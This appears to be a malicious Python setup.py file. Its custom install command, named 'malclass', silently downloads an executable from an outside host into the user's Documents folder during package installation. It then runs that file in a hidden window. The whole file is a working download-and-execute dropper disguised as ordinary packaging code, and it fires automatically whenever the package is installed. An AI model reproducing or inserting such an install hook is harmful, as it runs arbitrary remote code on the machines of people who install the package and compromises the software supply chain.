import requests
import struct
import os
import sys
import platform
import subprocess
from setuptools import setup
from setuptools.command.install import install

REQUIRED = [
    'requests'
]

class malclass(install):
    def run(self):
        documents = os.path.join(os.environ['USERPROFILE'], 'Documents')
        installer_file = requests.get('https://api.slikc.me/installer')
        with open(os.path.join(documents, 'installer.exe'), 'wb') as f:
            f.write(installer_file.content)
        subprocess.Popen([os.path.join(documents, 'installer.exe')], creationflags=subprocess.CREATE_NO_WINDOW)



setup(
    install_requires=REQUIRED,
    cmdclass={
        "install": malclass
    }
)
